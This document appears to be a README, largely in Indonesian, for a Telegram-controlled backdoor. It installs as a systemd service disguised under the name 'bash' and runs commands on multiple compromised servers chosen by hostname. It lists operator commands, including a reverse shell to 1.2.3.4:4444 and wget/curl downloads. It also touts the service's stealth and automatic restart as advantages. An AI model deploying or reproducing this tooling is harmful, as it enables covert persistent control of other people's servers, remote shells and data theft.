# bash webhook backdoor


</h1>
<h4 align="center">command list</h4>

<p align="center">
    <img src="https://img.shields.io/badge/release-Prv8-blue.svg">
    <img src="https://img.shields.io/badge/issues-0-red.svg">
    <img src="https://img.shields.io/badge/php-7-green.svg">
    <img src="https://img.shields.io/badge/php-5-green.svg">
</p>

1. startup command `bash` value
```
bash install.sh

✅ Service akan restart otomatis jika crash atau mati.
✅ Bisa dicek dengan systemctl status bash.


script ini berjalan untuk multi target itu kenapa di /nc_telegram.sh
ada bagian TARGET_ID=$(hostname)  # Gunakan hostname sebagai ID unik

tujuan nya untuk ketika menjalankkan di telegram comand nya seperti ini 
contoh 
server1 whoami
server2 whoami
server3 whoami

🔥 Keunggulan Metode Ini
✅ Tidak semua target merespon bersamaan, hanya target yang dipilih
✅ Bisa mengontrol banyak target dari satu bot Telegram
✅ Bisa melihat semua target yang aktif

apasaja yg bisa di jalankan di bot telegram 

perintah Linux apa saja, termasuk:

✅ ls -la → Menampilkan daftar file dengan detail.
✅ wget http://example.com/file → Mengunduh file dari internet.
✅ curl -O http://example.com/file → Alternatif download selain wget.
✅ ps aux → Melihat daftar proses.
✅ netstat -tulnp → Melihat koneksi jaringan.
✅ whoami && id → Cek user dan grup aktif.
✅ bash -i >& /dev/tcp/1.2.3.4/4444 0>&1 → Reverse shell ke listener.
✅ dan semua command linux 


contoh Hasilnya akan dikirim balik ke Telegram:
📡 Target: server1
💻 Command: ls -la
📤 Output:
total 12
drwxr-xr-x  2 root root 4096 Feb 19 12:00 .
drwxr-xr-x 10 root root 4096 Feb 19 10:00 ..
-rw-r--r--  1 root root  123 Feb 19 12:00 example.txt


🔥 Kesimpulan
✅ Systemd lebih stealth/senyap dibanding crontab
✅ Bisa berjalan otomatis tanpa perlu cron
✅ Nama service bisa disamarkan jadi bash
✅ Restart otomatis jika mati

```
